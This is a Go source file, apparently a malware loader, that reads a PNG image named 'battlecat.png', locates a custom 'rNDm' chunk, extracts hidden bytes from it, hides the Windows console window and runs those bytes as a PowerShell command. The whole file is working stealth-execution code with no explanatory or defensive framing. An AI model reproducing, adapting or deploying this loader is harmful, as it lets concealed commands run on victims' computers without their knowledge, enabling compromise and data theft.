package main

import (
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"syscall"
	
)

const (
	SW_HIDE = 0
)

var (
	kernel32       = syscall.NewLazyDLL("kernel32.dll")
	procGetConsole = kernel32.NewProc("GetConsoleWindow")
	user32         = syscall.NewLazyDLL("user32.dll")
	procShowWindow = user32.NewProc("ShowWindow")
)

func main() {
	inputFilePath := "battlecat.png"

	file, err := os.Open(inputFilePath)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	fileContent, err := ioutil.ReadAll(file)
	if err != nil {
		log.Fatal(err)
	}

	rNDmOffset := findRNDmSegmentOffset(fileContent)
	if rNDmOffset == -1 {
		return
	}

	payload := fileContent[rNDmOffset+8:]

	if len(payload) > 16 {
		payload = payload[:len(payload)-16]
	} else {
		payload = nil
	}

	if len(payload) > 0 {
		hideConsoleWindow()
		err := executePayload(payload)
		if err != nil {
			return
		}
	}
}

func findRNDmSegmentOffset(fileContent []byte) int {
	offset := 8

	for offset < len(fileContent) {
		length := int(fileContent[offset])<<24 | int(fileContent[offset+1])<<16 |
			int(fileContent[offset+2])<<8 | int(fileContent[offset+3])
		chunk := string(fileContent[offset+4 : offset+8])

		if chunk == "rNDm" {
			return offset
		}

		offset += 12 + length
	}

	return -1
}

func executePayload(payload []byte) error {
	cmd := exec.Command("powershell", "-Command", string(payload))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	return cmd.Run()
}

func hideConsoleWindow() {
	consoleHandle, _, _ := procGetConsole.Call()
	if consoleHandle == 0 {
		log.Println("Failed to get console window handle.")
		return
	}

	_, _, err := procShowWindow.Call(consoleHandle, uintptr(SW_HIDE))
	if err != nil && err.Error() != "The operation completed successfully." {
		log.Println("Failed to hide console window:", err)
	}
}
